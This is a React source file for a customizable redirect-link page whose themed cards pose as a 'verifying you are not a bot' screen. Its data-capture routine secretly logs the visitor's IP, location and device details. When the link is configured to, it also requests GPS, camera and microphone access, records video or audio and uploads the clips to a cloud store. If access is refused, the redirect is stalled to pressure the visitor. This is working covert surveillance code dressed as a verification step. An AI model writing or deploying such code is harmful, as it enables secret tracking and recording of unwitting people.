import * as React from 'react';
import { useParams } from 'react-router-dom';
import type { Settings, CapturedData, PermissionType } from '../types';
import { getTranslator } from '../contexts/LanguageContext';
import { useNotification } from '../contexts/SettingsContext';
import { NEW_REDIRECT_TEMPLATE, CARD_STYLES, CLOUDINARY_UPLOAD_URL, CLOUDINARY_UPLOAD_PRESET } from '../constants';
import { db } from '../firebase';
import { collection, addDoc, query, where, getDocs } from 'firebase/firestore';

interface RedirectPageProps {
  previewSettings?: Settings | Omit<Settings, 'id'>;
  isPreview?: boolean;
  isEmbeddedPreview?: boolean;
  onClosePreview?: () => void;
}

const VerificationText: React.FC<{className?: string, t: (key: string) => string;}> = ({ className, t }) => {
    return <p className={`text-xs font-semibold uppercase tracking-wider ${className}`}>{t('redirect_verify_bot')}</p>
}

// --- Individual Card Style Components ---

const Progress: React.FC<{ duration: number, isPaused: boolean, className?: string, progressClassName?: string, style?: React.CSSProperties, progressStyle?: React.CSSProperties }> = ({ duration, isPaused, className, progressClassName, style, progressStyle }) => {
  const [key, setKey] = React.useState(Date.now());
  React.useEffect(() => { if (!isPaused) setKey(Date.now()); }, [isPaused]);

  const innerAnimatedStyle = { animation: `progress ${duration}s linear forwards`, ...progressStyle };

  if (isPaused) return <div className={className} style={style}><div className={`${progressClassName} w-0`} style={progressStyle}/></div>;

  return (
    <div className={className} style={style}>
      <div key={key} className={progressClassName} style={innerAnimatedStyle} />
    </div>
  );
};

const TypewriterText: React.FC<{ text: string, duration: number, isPaused: boolean, className?: string }> = ({ text, duration, isPaused, className }) => {
    const [displayedText, setDisplayedText] = React.useState('');
    React.useEffect(() => {
        if (isPaused) {
            setDisplayedText('');
            return;
        }
        setDisplayedText('');
        let i = 0;
        const interval = setInterval(() => {
            if (i >= text.length) {
                clearInterval(interval);
                return;
            }
            setDisplayedText(prev => prev + text[i]);
            i++;
        }, (duration * 1000) / (text.length || 1));
        return () => clearInterval(interval);
    }, [text, duration, isPaused]);
    return <span className={`${className} overflow-hidden whitespace-nowrap border-r-4 border-r-transparent`}>{displayedText}</span>;
}

const DefaultWhiteCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string) => string; }> = ({ settings, isPaused, t }) => {
    return (
      <div className="w-full max-w-md animate-scale-in" style={{ color: settings.textColor }}>
        <div className="bg-white border border-slate-200/80 shadow-2xl rounded-2xl p-8 sm:p-12 text-center flex flex-col items-center gap-4">
          {settings.customIconUrl && <img src={settings.customIconUrl} alt="Icon" className="w-28 h-28 mb-4 object-contain" />}
          <h1 className="text-4xl font-bold text-blue-600 leading-tight">{settings.displayText}</h1>
          <p className="text-slate-500 mt-1">{t('redirect_default_card_subtitle')}</p>
          <div className="w-full pt-6 space-y-2">
            <VerificationText className="text-slate-400" t={t} />
            <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full bg-slate-200 rounded-full h-5 overflow-hidden" progressClassName="bg-blue-500 h-full rounded-full" />
          </div>
        </div>
      </div>
    );
};

const GlassCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string) => string; }> = ({ settings, isPaused, t }) => {
    return (
        <div className="w-full max-w-md animate-scale-in" style={{ color: settings.textColor }}>
            <div className="bg-white/10 backdrop-blur-xl border border-white/20 shadow-2xl rounded-2xl p-8 sm:p-12 text-center flex flex-col items-center gap-4">
                {settings.customIconUrl && <img src={settings.customIconUrl} alt="Icon" className="w-28 h-28 mb-4 object-contain" />}
                <h1 className="text-4xl font-bold leading-tight">{settings.displayText}</h1>
                <p className="opacity-80 mt-1">{t('redirect_glass_card_subtitle')}</p>
                <div className="w-full pt-6 space-y-2">
                    <VerificationText className="text-white/60" t={t}/>
                    <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full bg-white/20 rounded-full h-2 overflow-hidden" progressClassName="bg-white h-full rounded-full" />
                </div>
            </div>
        </div>
    );
};
const MinimalCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string) => string; }> = ({ settings, isPaused, t }) => {
    return (
        <div className="w-full max-w-2xl animate-fade-in-up text-center flex flex-col items-center gap-6 p-8" style={{ color: settings.textColor, textShadow: '0px 1px 10px rgba(0,0,0,0.5)' }}>
            {settings.customIconUrl && <img src={settings.customIconUrl} alt="Icon" className="w-24 h-24 object-contain" />}
            <h1 className="text-5xl font-extrabold leading-tight">{settings.displayText}</h1>
            <p className="opacity-80 text-lg">{t('redirect_minimal_card_subtitle')}</p>
            <div className="w-full pt-4 fixed bottom-0 left-0 space-y-2">
                <VerificationText className="text-white/60 text-center mb-1" t={t}/>
                <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full h-1" progressClassName="bg-white h-full" />
            </div>
        </div>
    );
};
const TerminalCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string, replacements?: Record<string, string|number>) => string; }> = ({ settings, isPaused, t }) => {
    return (
        <div className="w-full max-w-2xl font-mono animate-fade-in" style={{ color: settings.textColor }}>
            <div className="bg-[#0D1117] border border-green-500/30 shadow-2xl rounded-lg p-6">
                <div className="flex items-center gap-2 mb-4">
                    <div className="w-3 h-3 bg-red-500 rounded-full"></div>
                    <div className="w-3 h-3 bg-yellow-500 rounded-full"></div>
                    <div className="w-3 h-3 bg-green-500 rounded-full"></div>
                </div>
                <div className="text-green-400">
                    <p>{'>'} {t('redirect_terminal_auth')}</p>
                    <p>{'>'} {t('redirect_terminal_access')} {settings.customIconUrl && <img src={settings.customIconUrl} alt="Icon" className="w-8 h-8 inline-block mx-2 object-contain" />}</p>
                    <p>{'>'} {t('redirect_terminal_target')} <span className="text-cyan-400">{settings.redirectUrl}</span></p>
                    <p className="mb-2">{'>'} {t('redirect_terminal_message')} <span className="text-white">{settings.displayText}</span></p>
                    <div className="space-y-2">
                        <VerificationText className="text-green-500/80" t={t}/>
                        <div className="flex items-center gap-2">
                            <span>{'>'} {t('redirect_terminal_redirecting', {delay: settings.redirectDelay})} </span>
                            <div className="flex-1 bg-green-900 h-6 rounded-sm overflow-hidden">
                               <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full h-full" progressClassName="bg-green-500 h-full" />
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
};

const SleekDarkCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string) => string; }> = ({ settings, isPaused, t }) => (
  <div className="w-full max-w-md animate-scale-in" style={{ color: settings.textColor }}>
    <div className="bg-slate-900 border border-slate-700 shadow-2xl rounded-lg p-8 sm:p-12 text-center flex flex-col items-center gap-6">
      {settings.customIconUrl && <img src={settings.customIconUrl} alt="Icon" className="w-24 h-24 mb-2 object-contain" />}
      <h1 className="text-4xl font-semibold leading-tight">{settings.displayText}</h1>
      <div className="w-full pt-6 space-y-2">
        <VerificationText className="text-slate-400" t={t}/>
        <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full bg-slate-700 rounded-full h-1 overflow-hidden" progressClassName="bg-indigo-500 h-full rounded-full" />
      </div>
    </div>
  </div>
);

const ArticleCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string) => string; }> = ({ settings, isPaused, t }) => {
    return (
        <div className="w-full max-w-2xl animate-fade-in-up" style={{ color: settings.textColor }}>
            <div className="bg-white p-12 rounded-lg shadow-2xl">
                {settings.customIconUrl && (
                    <div className="mb-6 h-48 w-full overflow-hidden rounded-md bg-slate-200">
                        <img src={settings.customIconUrl} alt="Article hero" className="w-full h-full object-cover"/>
                    </div>
                )}
                <p className="text-sm font-semibold uppercase tracking-widest text-indigo-600 mb-2">{t('redirect_article_heading')}</p>
                <h1 className="text-4xl lg:text-5xl font-bold font-serif text-slate-900 mb-6">{settings.displayText}</h1>
                <div className="flex items-center gap-4">
                    <div className="w-12 h-12 bg-slate-200 rounded-full"></div>
                    <div>
                        <p className="font-semibold text-slate-800">{t('redirect_article_author')}</p>
                        <p className="text-slate-500 text-sm">{t('redirect_article_subtitle')}</p>
                    </div>
                </div>
                 <div className="w-full pt-8 space-y-2">
                    <VerificationText className="text-slate-400" t={t}/>
                    <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full h-1 bg-slate-200" progressClassName="bg-indigo-500 h-full" />
                </div>
            </div>
        </div>
    );
};

const GradientBurstCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string) => string; }> = ({ settings, isPaused, t }) => {
    const gradientStyle = {
        backgroundSize: '400% 400%',
        backgroundImage: `linear-gradient(-45deg, ${settings.gradientColors.join(', ')})`,
    };

    return (
        <div className="w-full max-w-lg animate-scale-in" style={{ color: settings.textColor }}>
            <div className="p-1 rounded-2xl shadow-2xl animate-background-pan" style={gradientStyle}>
                <div className="bg-slate-900/80 backdrop-blur-lg rounded-xl p-12 text-center flex flex-col items-center gap-6">
                     {settings.customIconUrl && <img src={settings.customIconUrl} alt="Icon" className="w-28 h-28 mb-4 object-contain rounded-full shadow-lg border-4 border-white/20" />}
                    <h1 className="text-5xl font-extrabold leading-tight text-white" style={{textShadow: '0 2px 10px rgba(0,0,0,0.3)'}}>{settings.displayText}</h1>
                    <p className="text-white/80 mt-1">{t('redirect_gradient_card_subtitle')}</p>
                    <div className="w-full pt-6 space-y-2">
                        <VerificationText className="text-white/60" t={t}/>
                        <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full bg-white/20 rounded-full h-2.5 overflow-hidden" progressClassName="bg-white h-full rounded-full" />
                    </div>
                </div>
            </div>
        </div>
    );
};

const ElegantCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string) => string; }> = ({ settings, isPaused, t }) => {
    return (
        <div className="w-full max-w-md animate-fade-in" style={{ color: settings.textColor }}>
            <div className="bg-white/90 p-12 text-center flex flex-col items-center gap-4 relative">
                <div className="absolute inset-0 border-4 border-black/80"></div>
                {settings.customIconUrl && <img src={settings.customIconUrl} alt="Icon" className="w-24 h-24 mb-4 object-contain" />}
                <h1 className="text-4xl font-serif font-bold text-black/80">{settings.displayText}</h1>
                <p className="text-black/60 font-serif italic">{t('redirect_elegant_card_subtitle')}</p>
                <div className="w-full pt-8 space-y-2">
                    <VerificationText className="text-black/50" t={t}/>
                    <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full h-0.5 bg-black/10" progressClassName="bg-black/80 h-full" />
                </div>
            </div>
        </div>
    );
};
const RetroTVCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string) => string; }> = ({ settings, isPaused, t }) => {
    return (
        <div className="w-full max-w-xl font-mono animate-fade-in" style={{ color: settings.textColor }}>
            <div className="bg-black p-2 rounded-2xl border-4 border-slate-800 shadow-inner shadow-slate-900">
                <div className="bg-slate-900 aspect-video rounded-lg overflow-hidden relative flex flex-col items-center justify-center text-center p-8 scanline">
                    {settings.customIconUrl && <img src={settings.customIconUrl} alt="Icon" className="w-20 h-20 mb-4 object-contain opacity-80" />}
                    <h1 className="text-4xl font-bold text-green-400" style={{textShadow: '0 0 5px #32cd32, 0 0 10px #32cd32'}}>
                        <TypewriterText text={settings.displayText} duration={2} isPaused={isPaused} />
                    </h1>
                    <div className="w-full absolute bottom-4 left-0 px-8 space-y-2">
                        <VerificationText className="text-green-500/80 animate-flicker" t={t}/>
                        <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full h-2 bg-green-900/50" progressClassName="bg-green-500 h-full" />
                    </div>
                </div>
            </div>
        </div>
    );
};

const VideoPlayerCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string, replacements?: Record<string, string|number>) => string; }> = ({ settings, isPaused, t }) => {
    return (
      <div className="w-full max-w-xl animate-scale-in font-sans" style={{ color: settings.textColor }}>
        <div className="bg-black border border-slate-700 shadow-2xl rounded-lg overflow-hidden">
          <div className="aspect-video bg-slate-900 flex items-center justify-center relative">
            {!isPaused && settings.customIconUrl ? (
              <img src={settings.customIconUrl} alt="Icon" className="w-1/3 h-1/3 object-contain opacity-50" />
            ) : (
              <div className="w-20 h-20 bg-white/10 rounded-full flex items-center justify-center cursor-pointer">
                <svg className="w-10 h-10 text-white ml-1" viewBox="0 0 24 24" fill="currentColor"><path d="M8 5v14l11-7z"/></svg>
              </div>
            )}
            <p className="absolute bottom-4 left-4 text-white text-xs bg-black/50 px-2 py-1 rounded">{t('redirect_video_player_loading')}</p>
          </div>
          <div className="p-4 space-y-2">
            <h1 className="text-xl font-bold text-white">{settings.displayText}</h1>
            <p className="text-sm text-slate-400">{t('redirect_video_player_redirecting', {url: settings.redirectUrl})}</p>
            <div className="pt-2 space-y-2">
                <VerificationText className="text-slate-400" t={t}/>
                <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full bg-slate-700 rounded-full h-2" progressClassName="bg-red-600 h-full rounded-full" />
            </div>
          </div>
        </div>
      </div>
    );
};

const parseUserAgent = (ua: string) => {
    let os = "Unknown OS";
    let browser = "Unknown Browser";
    let deviceType = "Desktop";

    if (/mobi/i.test(ua)) deviceType = "Mobile";

    if (/android/i.test(ua)) os = "Android";
    else if (/iPad|iPhone|iPod/.test(ua)) os = "iOS";
    else if (/windows phone/i.test(ua)) os = "Windows Phone";
    else if (/windows/i.test(ua)) os = "Windows";
    else if (/macintosh|mac os x/i.test(ua)) os = "macOS";
    else if (/linux/i.test(ua)) os = "Linux";

    if (/chrome|crios|crmo/i.test(ua)) browser = "Chrome";
    else if (/firefox|fxios/i.test(ua)) browser = "Firefox";
    else if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = "Safari";
    else if (/edg/i.test(ua)) browser = "Edge";
    
    return { os, browser, deviceType };
};


// --- Main Redirect Page Component ---

const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview: isPreviewProp, isEmbeddedPreview = false, onClosePreview }) => {
  const { data } = useParams<{ data: string }>();
  const addNotification = useNotification();
  
  const [settings, setSettings] = React.useState<Settings | null>(null);
  const [error, setError] = React.useState<string | null>(null);
  const [isPaused, setIsPaused] = React.useState(true);
  const [showDeniedPopup, setShowDeniedPopup] = React.useState(false);
  const [t, setT] = React.useState(() => getTranslator('en'));
  
  const isPreview = !!isPreviewProp;
  const isMounted = React.useRef(true);

  React.useEffect(() => {
    isMounted.current = true;
    return () => { isMounted.current = false; };
  }, []);

  React.useEffect(() => {
    const loadData = async () => {
        if (previewSettings) {
            const configToLoad = 'id' in previewSettings 
                ? previewSettings as Settings 
                : { ...NEW_REDIRECT_TEMPLATE, ...previewSettings, id: 'preview' } as Settings;
            setSettings(configToLoad);
            setT(() => getTranslator(configToLoad.redirectLanguage || 'en'));
            setIsPaused(false);
            return;
        }

        if (!data) {
          setError(t('redirect_invalid_link_subtitle'));
          return;
        }

        try {
          const q = query(collection(db, "redirects"), where("urlIdentifier", "==", data));
          const querySnapshot = await getDocs(q);

          if (querySnapshot.empty) {
            setError(t('redirect_invalid_link_subtitle'));
            return;
          }
          
          const doc = querySnapshot.docs[0];
          const configToLoad = { id: doc.id, ...doc.data() } as Settings;
          
          setSettings(configToLoad);
          setT(() => getTranslator(configToLoad.redirectLanguage));
          setIsPaused(!isPreview);
        } catch (e) {
          console.error("Invalid redirect data in URL:", e);
          setError(t('redirect_invalid_link_subtitle'));
        }
    };
    loadData();
  }, [data, previewSettings, isPreview, t]);


  React.useEffect(() => {
    if (!settings || isPreview || !isPaused) return;

    const performRedirect = () => {
        if (!isMounted.current) return;
        try {
            let url = new URL(settings.redirectUrl.startsWith('http') ? settings.redirectUrl : `https://${settings.redirectUrl}`);
            window.location.href = url.toString();
        } catch (error) {
            console.error("Invalid URL:", settings.redirectUrl);
            setError(`The destination URL "${settings.redirectUrl}" is invalid.`);
        }
    };
    
    const startRedirectSequence = () => {
        if (!isMounted.current) return;
        setIsPaused(false); // Start the progress bar
        
        const redirectTimer = setTimeout(performRedirect, settings.redirectDelay * 1000);
        return () => clearTimeout(redirectTimer);
    };

    const handleDataCapture = async () => {
        const redirectId = settings.id;
        if (!redirectId) {
            console.error("Could not save capture data: redirectId is missing from payload.");
            startRedirectSequence(); // Fail gracefully and just redirect
            return;
        }

        const { os, browser, deviceType } = parseUserAgent(navigator.userAgent);
        
        const capturedData: Omit<CapturedData, 'id'> = {
            redirectId,
            name: `Capture @ ${new Date().toLocaleString()}`,
            timestamp: Date.now(),
            ip: 'Fetching...',
            userAgent: navigator.userAgent,
            os,
            browser,
            deviceType,
            language: navigator.language,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            location: { lat: null, lon: null, city: 'Unknown', country: 'Unknown', source: 'ip' },
            permissions: { 
                location: settings.captureInfo.permissions.includes('location') ? 'prompt' : 'n/a',
                camera: settings.captureInfo.permissions.includes('camera') ? 'prompt' : 'n/a',
                microphone: settings.captureInfo.permissions.includes('microphone') ? 'prompt' : 'n/a',
            }
        };

        try {
            const ipResponse = await fetch('https://ipapi.co/json/');
            if (ipResponse.ok) {
                const ipData = await ipResponse.json();
                capturedData.ip = ipData.ip;
                capturedData.location = {
                    lat: ipData.latitude,
                    lon: ipData.longitude,
                    city: ipData.city,
                    country: ipData.country_name,
                    source: 'ip',
                };
            }
        } catch (e) { console.error("Could not fetch IP data:", e); }

        let anyPermissionDenied = false;
        
        // Sequential permission requests
        for (const permission of settings.captureInfo.permissions) {
             try {
                if (permission === 'location') {
                    const pos = await new Promise<GeolocationPosition>((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
                    });
                    capturedData.permissions.location = 'granted';
                    capturedData.location = { lat: pos.coords.latitude, lon: pos.coords.longitude, city: capturedData.location.city, country: capturedData.location.country, source: 'gps'};
                
                } else if (permission === 'camera' || permission === 'microphone') {
                    const constraints = {
                        video: permission === 'camera',
                        audio: permission === 'microphone',
                    };
                    const stream = await navigator.mediaDevices.getUserMedia(constraints);
                    
                    if (permission === 'camera') capturedData.permissions.camera = 'granted';
                    if (permission === 'microphone') capturedData.permissions.microphone = 'granted';

                    const mediaBlob = await new Promise<Blob>((resolve) => {
                        const recorder = new MediaRecorder(stream, { mimeType: permission === 'camera' ? 'video/webm' : 'audio/webm' });
                        const chunks: Blob[] = [];
                        recorder.ondataavailable = e => chunks.push(e.data);
                        recorder.onstop = () => resolve(new Blob(chunks, { type: recorder.mimeType }));
                        setTimeout(() => recorder.stop(), settings.captureInfo.recordingDuration * 1000);
                        recorder.start();
                    });
                    
                    const formData = new FormData();
                    formData.append('file', mediaBlob);
                    formData.append('upload_preset', CLOUDINARY_UPLOAD_PRESET);
                    
                    const res = await fetch(CLOUDINARY_UPLOAD_URL, { method: 'POST', body: formData });
                    const uploadData = await res.json();
                    
                    if (permission === 'camera') capturedData.cameraCapture = uploadData.secure_url;
                    if (permission === 'microphone') capturedData.microphoneCapture = uploadData.secure_url;

                    stream.getTracks().forEach(track => track.stop());
                }
            } catch {
                if (permission === 'location') capturedData.permissions.location = 'denied';
                if (permission === 'camera') capturedData.permissions.camera = 'denied';
                if (permission === 'microphone') capturedData.permissions.microphone = 'denied';
                anyPermissionDenied = true;
                setShowDeniedPopup(true);
                break; // Stop asking for more permissions if one is denied
            }
        }
        
        try {
            await addDoc(collection(db, "captures"), capturedData);
        } catch(e) { console.error("Failed to save captured data:", e); }
        
        if (anyPermissionDenied) {
            setIsPaused(true); // Pause the redirect indefinitely
        } else {
            addNotification({ type: 'success', message: 'notification_verification_success' });
            startRedirectSequence();
        }
    };
    
    if(settings && settings.captureInfo.permissions.length > 0) {
      handleDataCapture();
    } else if (settings) {
      startRedirectSequence();
    }

  }, [settings, isPreview, isPaused, addNotification]);
  
  const handleClosePreview = () => onClosePreview?.();

  if (error) {
    return (
      <div className="w-full h-full flex flex-col justify-center items-center gap-4 bg-slate-900 text-slate-200 text-center p-4">
        <h1 className="text-2xl font-bold">{t('redirect_invalid_link_title')}</h1>
        <p>{error}</p>
      </div>
    );
  }

  if (!settings) {
     return <div className="w-full h-full bg-slate-900 flex justify-center items-center"><h1 className="text-2xl font-bold text-white">{t('loading')}...</h1></div>;
  }
  
  const containerStyle = {
    backgroundColor: settings.backgroundColor,
    ...(settings.backgroundImageUrl && { backgroundImage: `url(${settings.backgroundImageUrl})` }),
  };
  
  const renderCard = () => {
    // If permissions were denied, isPaused will be true, halting the progress bar.
    const props = { settings, isPaused: isPreview || isPaused, t };
    return (
      <div className={`relative transition-all duration-300 ${showDeniedPopup ? 'blur-md' : ''}`}>
        {(() => {
          switch (settings.cardStyle) {
            case 'glass': return <GlassCard {...props} />;
            case 'minimal': return <MinimalCard {...props} />;
            case 'elegant': return <ElegantCard {...props} />;
            case 'sleek-dark': return <SleekDarkCard {...props} />;
            case 'article': return <ArticleCard {...props} />;
            case 'terminal': return <TerminalCard {...props} />;
            case 'retro-tv': return <RetroTVCard {...props} />;
            case 'gradient-burst': return <GradientBurstCard {...props} />;
            case 'video-player': return <VideoPlayerCard {...props} />;
            default: return <DefaultWhiteCard {...props} />;
          }
        })()}
      </div>
    );
  };

  return (
    <div
      className={`relative w-full h-full flex flex-col justify-center items-center transition-colors duration-500 bg-cover bg-center p-4 overflow-hidden font-sans`}
      style={containerStyle}
    >
        {isPreview && !isEmbeddedPreview && (
            <div className="absolute top-4 right-4 text-right z-10 animate-fade-in">
                <div className="bg-black/40 backdrop-blur-sm rounded-lg p-3 shadow-lg">
                    <button onClick={handleClosePreview} className="font-semibold py-1 px-3 rounded-md transition-colors bg-slate-200 text-slate-800 hover:bg-white">
                        {t('close')}
                    </button>
                </div>
            </div>
        )}
        {showDeniedPopup && (
             <div className="absolute inset-0 z-20 flex items-center justify-center animate-fade-in p-4">
                 <div className="text-center bg-black/50 backdrop-blur-lg p-8 rounded-2xl max-w-sm border border-slate-700 shadow-2xl">
                     <h2 className="text-2xl font-bold text-red-400 mb-2">{t('redirect_permissions_denied_title')}</h2>
                     <p className="text-slate-300">{t('redirect_permissions_denied_message')}</p>
                 </div>
             </div>
        )}
        {renderCard()}
    </div>
  );
};

export default RedirectPage;